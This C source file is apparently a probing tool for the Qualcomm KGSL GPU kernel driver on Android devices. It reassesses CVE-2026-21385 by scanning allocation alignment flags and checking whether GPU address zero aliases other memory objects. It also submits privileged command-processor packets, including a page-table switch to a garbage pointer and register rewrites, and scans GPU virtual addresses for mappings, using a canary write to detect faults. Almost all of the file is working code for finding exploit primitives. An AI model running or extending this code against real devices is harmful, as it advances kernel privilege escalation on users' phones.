/* kgsl_tricheck.c — §BM 后续三项检查(2026-09-16)
 * ① CVE-2026-21385 重估: GPUOBJ 对象 GPU 可达性 + align 位扫描 + VA0 别名检查
 * ② 特权 PM4 枚举: REG_TO_MEM / INDIRECT_BUFFER / SMMU_TABLE_UPDATE / REG_RMW / WAIT_REG_MEM
 * ③ GPU VA 布局: MEM_TO_MEM 逐 VA 探测(无映射 → hard fault → canary 判定)
 *
 * 用法: tricheck reach|align|cve|ops|vas
 * 故障预言器: 探测 op 后同 ctx 提交 canary(CP_MEM_WRITE out+0x700=0xA5A5A5A5),
 *            canary 提交失败(EDEADLK 等) = 探测 op 触发 hard fault(ctx 被作废)。
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include "adrenaline.h"

/* ---- KGSL structs (kgsl_obj.c / kgsl_align2.c 实测布局) ---- */
typedef struct { uint64_t size, flags, va_len, mmapsize; uint32_t id, metadata_len; uint64_t metadata; } gpuobj_alloc_t;
typedef struct { uint64_t gpuaddr, flags, size, va_len, va_addr; uint32_t id; } gpuobj_info_t;
typedef struct { uint64_t flags, priv; uint32_t id, type, len; } gpuobj_free_t;

#define IOCTL_OBJALLOC _IOWR(0x09, 0x45, gpuobj_alloc_t)
#define IOCTL_OBJINFO  _IOWR(0x09, 0x47, gpuobj_info_t)
#define IOCTL_OBJFREE  _IOW(0x09, 0x46, gpuobj_free_t)
#define IOCTL_DCC      _IOWR(0x09, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_DCD      _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_MUM      _IOWR(0x09, 0x15, struct kgsl_map_user_mem)
#define IOCTL_GC       _IOWR(0x09, 0x4A, struct kgsl_gpu_command)

static int fd;
static uint64_t g_clsz;

static void cache_op(void *start, void *end, int inval) {
    start = (char*)((uintptr_t)start & ~(g_clsz - 1));
    for (; start < end; start += g_clsz) {
        if (inval) __asm volatile("dc civac, %0" : : "r" (start) : "memory");
        else       __asm volatile("dc cvac, %0"  : : "r" (start) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}

static uint32_t *ib, *out;          /* ADDR 映射的 IB 与观测缓冲 */
static uint64_t ib_ga, out_ga;

static int ctx_create(uint32_t *ctx) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, IOCTL_DCC, &req);
    if (r) return r;
    *ctx = req.drawctxt_id;
    return 0;
}
static void ctx_destroy(uint32_t ctx) {
    struct kgsl_drawctxt_destroy req = { .drawctxt_id = ctx };
    ioctl(fd, IOCTL_DCD, &req);
}

static int gpu_command(uint32_t ctx, uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, IOCTL_GC, &req);
}

static int obj_alloc(uint64_t size, uint64_t flags, uint32_t *id, uint64_t *ga, uint32_t *msz) {
    gpuobj_alloc_t a; memset(&a, 0, sizeof(a));
    a.size = size; a.flags = flags;
    int r = ioctl(fd, IOCTL_OBJALLOC, &a);
    if (r) return r;
    *id = a.id; *msz = a.mmapsize;
    gpuobj_info_t i; memset(&i, 0, sizeof(i)); i.id = a.id;
    if (!ioctl(fd, IOCTL_OBJINFO, &i)) *ga = i.gpuaddr; else *ga = ~0ull;
    return 0;
}
static int obj_free(uint32_t id) { gpuobj_free_t f; memset(&f, 0, sizeof(f)); f.id = id; return ioctl(fd, IOCTL_OBJFREE, &f); }

static uint32_t *obj_mmap(uint64_t ga, uint32_t len) {
    /* 两种 offset 语义都试: 直接 gpuaddr / gpuaddr-0x3FFFFFF000(§AA) */
    uint32_t *p = mmap(NULL, len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)ga);
    if (p == MAP_FAILED)
        p = mmap(NULL, len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)(ga - 0x3FFFFFF000ull));
    return p;
}

/* canary 故障预言器: 返回 1=ctx 健康 0=执行异常 -1=提交失败(ctx 已 fault) */
static int canary(uint32_t ctx) {
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = lower_32_bits(out_ga + 0x700);
    *c++ = upper_32_bits(out_ga + 0x700);
    *c++ = 0xA5A5A5A5;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    int r = gpu_command(ctx, ib_ga, 16);
    if (r) return -1;
    sleep(1);
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
    return out[0x1C0] == 0xA5A5A5A5;
}

static void setup(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open fail\n"); exit(1); }
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    out = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000); memset(out, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, IOCTL_MUM, &m)) { printf("map ib fail %s\n", strerror(errno)); exit(1); }
    ib_ga = m.gpuaddr;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)out; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, IOCTL_MUM, &m)) { printf("map out fail %s\n", strerror(errno)); exit(1); }
    out_ga = m.gpuaddr;
    printf("# ib_ga=0x%llx out_ga=0x%llx\n", (unsigned long long)ib_ga, (unsigned long long)out_ga);
}

/* ============ ①-a GPUOBJ 对象 GPU 可达性 ============ */
static void do_reach(void) {
    uint32_t id, msz; uint64_t ga;
    if (obj_alloc(0x1000, 0, &id, &ga, &msz)) { printf("alloc fail %s\n", strerror(errno)); return; }
    printf("obj id=%u ga=0x%llx mmapsize=%u\n", id, (unsigned long long)ga, msz);
    uint32_t *m = obj_mmap(ga, msz ? msz : 0x1000);
    if (m == MAP_FAILED) { printf("mmap obj fail %s\n", strerror(errno)); return; }
    memset(m, 0, 0x1000);
    cache_op(m, (uint8_t*)m + 0x1000, 0);

    uint32_t ctx;
    ctx_create(&ctx);
    /* GPU -> obj */
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = lower_32_bits(ga); *c++ = upper_32_bits(ga);
    *c++ = 0x51CE0001;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    printf("GPU CP_MEM_WRITE obj <- 0x51CE0001: submit=%d\n", gpu_command(ctx, ib_ga, 16));
    sleep(1);
    /* canary */
    int cv = canary(ctx);
    cache_op(m, (uint8_t*)m + 0x1000, 1);
    printf("canary=%d  obj[0]=0x%08x %s\n", cv, m[0],
           m[0] == 0x51CE0001 ? "<<< GPUOBJ 对象 GPU 可达!!!" : "(未变)");
    /* obj -> GPU -> out */
    if (m[0] == 0x51CE0001) {
        m[0x40] = 0x51CE0002;
        cache_op(m, (uint8_t*)m + 0x1000, 0);
        c = ib;
        *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
        *c++ = 0;
        *c++ = lower_32_bits(out_ga + 0x600); *c++ = upper_32_bits(out_ga + 0x600);
        *c++ = lower_32_bits(ga + 0x100);     *c++ = upper_32_bits(ga + 0x100);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        printf("GPU MEM_TO_MEM out<-obj+0x100: submit=%d\n", gpu_command(ctx, ib_ga, 24));
        sleep(1);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
        printf("out[0x180]=0x%08x %s\n", out[0x180], out[0x180] == 0x51CE0002 ? "<<< 双向可达" : "(未变)");
    }
    ctx_destroy(ctx);
    obj_free(id);
}

/* ============ ①-b align 位扫描(CVE-2026-21385) ============ */
static void do_align(void) {
    printf("align | flags | alloc | id | gpuaddr | mmapsize\n");
    for (int al = 0; al <= 31; al++) {
        uint32_t id, msz; uint64_t ga;
        uint64_t flags = (uint64_t)al << 24;
        int r = obj_alloc(0x1000, flags, &id, &ga, &msz);
        if (r) { printf("%5d | %08llx | EINVAL(%d)\n", al, (unsigned long long)flags, errno); continue; }
        printf("%5d | %08llx | OK | %u | 0x%llx | %u\n", al, (unsigned long long)flags,
               id, (unsigned long long)ga, msz);
        obj_free(id);
    }
}

/* ============ ①-c VA0/别名利用面 ============ */
static void do_cve(void) {
    uint32_t id1, id2, id3, msz; uint64_t g1, g2, g3;
    if (obj_alloc(0x1000, 0, &id1, &g1, &msz)) { printf("alloc1 fail\n"); return; }
    printf("obj1 id=%u ga=0x%llx\n", id1, (unsigned long long)g1);
    uint32_t *m1 = obj_mmap(g1, 0x1000);
    if (m1 == MAP_FAILED) { printf("mmap1 fail %s\n", strerror(errno)); return; }
    memset(m1, 0, 0x1000);
    cache_op(m1, (uint8_t*)m1 + 0x1000, 0);

    int r2 = obj_alloc(0x1000, 31ull << 24, &id2, &g2, &msz);
    printf("obj2(align31) alloc=%d id=%u ga=0x%llx\n", r2, id2, (unsigned long long)g2);
    uint32_t *m2 = MAP_FAILED;
    if (!r2) {
        m2 = obj_mmap(g2, msz ? msz : 0x1000);
        printf("obj2 mmap=%s\n", m2 == MAP_FAILED ? strerror(errno) : "OK");
        if (m2 != MAP_FAILED) { memset(m2, 0, 0x1000); cache_op(m2, (uint8_t*)m2 + 0x1000, 0); }
    }
    uint32_t id3v = 0;
    int r3 = obj_alloc(0x1000, 0, &id3, &g3, &msz);
    printf("obj3(后置正常) alloc=%d id=%u ga=0x%llx\n", r3, id3, (unsigned long long)g3);
    uint32_t *m3 = MAP_FAILED;
    if (!r3 && g3 != ~0ull) { m3 = obj_mmap(g3, 0x1000); if (m3 != MAP_FAILED) { memset(m3, 0, 0x1000); cache_op(m3, (uint8_t*)m3 + 0x1000, 0); } }

    uint32_t ctx; ctx_create(&ctx);
    /* GPU 写 VA0 (obj2 的 gpuaddr=0) */
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = lower_32_bits(g2); *c++ = upper_32_bits(g2);
    *c++ = 0xC0DE0001;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    printf("GPU write VA0(=obj2 ga 0x%llx) <- 0xC0DE0001: submit=%d\n", (unsigned long long)g2, gpu_command(ctx, ib_ga, 16));
    sleep(1);
    int cv = canary(ctx);
    printf("canary=%d\n", cv);
    /* GPU 读 VA0 → out */
    if (cv == 1) {
        c = ib;
        *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
        *c++ = 0;
        *c++ = lower_32_bits(out_ga + 0x800); *c++ = upper_32_bits(out_ga + 0x800);
        *c++ = lower_32_bits(g2);             *c++ = upper_32_bits(g2);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        printf("GPU MEM_TO_MEM out<-VA0: submit=%d\n", gpu_command(ctx, ib_ga, 24));
        sleep(1);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
        printf("out[0x200](VA0 内容)=0x%08x\n", out[0x200]);
        /* 别名检查: obj1/obj2/obj3 CPU 侧是否看到 0xC0DE0001 */
        cache_op(m1, (uint8_t*)m1 + 0x1000, 1);
        printf("obj1[0]=0x%08x %s\n", m1[0], m1[0] == 0xC0DE0001 ? "<<< VA0 与 obj1 别名!!!" : "");
        if (m2 != MAP_FAILED) { cache_op(m2, (uint8_t*)m2 + 0x1000, 1); printf("obj2[0]=0x%08x %s\n", m2[0], m2[0] == 0xC0DE0001 ? "<<< obj2 自身可见" : ""); }
        if (m3 != MAP_FAILED) { cache_op(m3, (uint8_t*)m3 + 0x1000, 1); printf("obj3[0]=0x%08x %s\n", m3[0], m3[0] == 0xC0DE0001 ? "<<< VA0 与 obj3 别名!!!" : ""); }
    }
    ctx_destroy(ctx);
    obj_free(id1); if (!r2) obj_free(id2); if (!r3) obj_free(id3);
}

/* ============ ② 特权 PM4 枚举 ============ */
static void b_reg_to_mem(uint32_t *c) {
    *c++ = cp_type7_packet(0x3e, 3);              /* CP_REG_TO_MEM */
    *c++ = 0x200;                                  /* RBBM_HW_VERSION */
    *c++ = lower_32_bits(out_ga + 0x600);
    *c++ = upper_32_bits(out_ga + 0x600);
}
static void b_indirect(uint32_t *c) {
    uint32_t *ib2 = ib + 0x40;                     /* ib+0x100 处放 IB2 */
    ib2[0] = cp_type7_packet(CP_MEM_WRITE, 3);
    ib2[1] = lower_32_bits(out_ga + 0x600); ib2[2] = upper_32_bits(out_ga + 0x600);
    ib2[3] = 0x22220002;
    *c++ = cp_type7_packet(0x3f, 3);              /* CP_INDIRECT_BUFFER */
    *c++ = lower_32_bits(ib_ga + 0x100);
    *c++ = upper_32_bits(ib_ga + 0x100);
    *c++ = 4;                                      /* sizedwords */
}
static void b_smmu(uint32_t *c) {
    *c++ = cp_type7_packet(0x53, 4);              /* CP_SMMU_TABLE_UPDATE */
    *c++ = lower_32_bits(0xdeadbeef000ull);       /* 垃圾 TTBR0 — 若执行, 后续取指必 fault */
    *c++ = upper_32_bits(0xdeadbeef000ull);
    *c++ = 0;
    *c++ = 0;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);      /* 真实 VA 写(若切换成功必 fault) */
    *c++ = lower_32_bits(out_ga + 0x600);
    *c++ = upper_32_bits(out_ga + 0x600);
    *c++ = 0x53330003;
}
static void b_reg_rmw(uint32_t *c) {
    *c++ = cp_type7_packet(0x21, 3);              /* CP_REG_RMW */
    *c++ = 0x200;                                  /* RBBM_HW_VERSION */
    *c++ = 0x00000000;
    *c++ = 0x00000000;
}
static void b_wait_reg_mem(uint32_t *c) {
    *c++ = cp_type7_packet(0x3c, 6);              /* CP_WAIT_REG_MEM */
    *c++ = 0;
    *c++ = lower_32_bits(out_ga + 0x6F0);
    *c++ = upper_32_bits(out_ga + 0x6F0);
    *c++ = 0x12345678;                             /* 预填的值 → EQ 立即满足 */
    *c++ = 0xFFFFFFFF;
    *c++ = 0x00000006;                             /* func=EQ */
}

static void b_nop(uint32_t *c) {
    *c++ = cp_type7_packet(CP_NOP, 0);
}

static void one_op(const char *name, void (*build)(uint32_t*), uint32_t iblen) {
    uint32_t ctx;
    if (ctx_create(&ctx)) { printf("%-26s ctx fail %s\n", name, strerror(errno)); return; }
    memset(ib, 0, 0x1000);
    if (build) build(ib);
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    int r = gpu_command(ctx, ib_ga, iblen);
    sleep(1);
    int cv = canary(ctx);
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
    printf("%-26s submit=%d canary=%d out[0x180]=0x%08x out[0x1BC]=0x%08x\n",
           name, r, cv, out[0x180], out[0x1BC]);
    ctx_destroy(ctx);
}

static void do_ops(void) {
    out[0x1BC] = 0x12345678;                       /* WAIT_REG_MEM 参照值 */
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 0);
    printf("== ② 特权 PM4 枚举(每 op 新 ctx, canary 判 fault) ==\n");
    one_op("baseline CP_NOP", b_nop, 4);
    one_op("CP_REG_TO_MEM 0x200", b_reg_to_mem, 16);
    one_op("CP_INDIRECT_BUFFER", b_indirect, 16);
    one_op("CP_SMMU_TABLE_UPDATE", b_smmu, 32);
    one_op("CP_REG_RMW 0x200", b_reg_rmw, 16);
    one_op("CP_WAIT_REG_MEM EQ", b_wait_reg_mem, 28);
    /* REG_TO_MEM 复读: RMW 后寄存器值是否被改 */
    one_op("CP_REG_TO_MEM 0x200 (复读)", b_reg_to_mem, 16);
}

/* ============ ③ GPU VA 布局扫描 ============ */
static const uint64_t g_vas[] = {
    0x0, 0x1000, 0x100000, 0x1000000, 0x10000000,
    0x40000000, 0x80000000, 0xf0000000, 0xfc000000, 0xfd000000,
    0xfe000000, 0xff000000, 0xfff00000, 0xfffff000,
    0x4000000000ull, 0x4000001000ull, 0x4000000000ull - 0x1000,
    0x4000000000ull - 0x100000, 0x8000000000ull, 0x400000000000ull,
};

static void do_vas(void) {
    printf("== ③ GPU VA 布局(MEM_TO_MEM va -> out+0x800, 新 ctx/VA) ==\n");
    for (unsigned i = 0; i < sizeof(g_vas)/sizeof(g_vas[0]); i++) {
        uint64_t va = g_vas[i];
        uint32_t ctx;
        if (ctx_create(&ctx)) { printf("ctx fail, stop\n"); return; }
        out[0x200] = 0;
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 0);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
        *c++ = 0;
        *c++ = lower_32_bits(out_ga + 0x800); *c++ = upper_32_bits(out_ga + 0x800);
        *c++ = lower_32_bits(va);             *c++ = upper_32_bits(va);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        int r = gpu_command(ctx, ib_ga, 24);
        sleep(1);
        int cv = canary(ctx);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
        printf("VA 0x%012llx: submit=%d canary=%d out[0x200]=0x%08x %s\n",
               (unsigned long long)va, r, cv, out[0x200],
               cv == 1 ? (out[0x200] ? "映射(读到数据)" : "映射(全零)") : "FAULT/无效");
        ctx_destroy(ctx);
    }
}

int main(int argc, char **argv) {
    if (argc < 2) { printf("usage: tricheck reach|align|cve|ops|vas\n"); return 1; }
    setup();
    if (!strcmp(argv[1], "reach")) do_reach();
    else if (!strcmp(argv[1], "align")) do_align();
    else if (!strcmp(argv[1], "cve")) do_cve();
    else if (!strcmp(argv[1], "ops")) do_ops();
    else if (!strcmp(argv[1], "vas")) do_vas();
    printf("done alive\n");
    return 0;
}
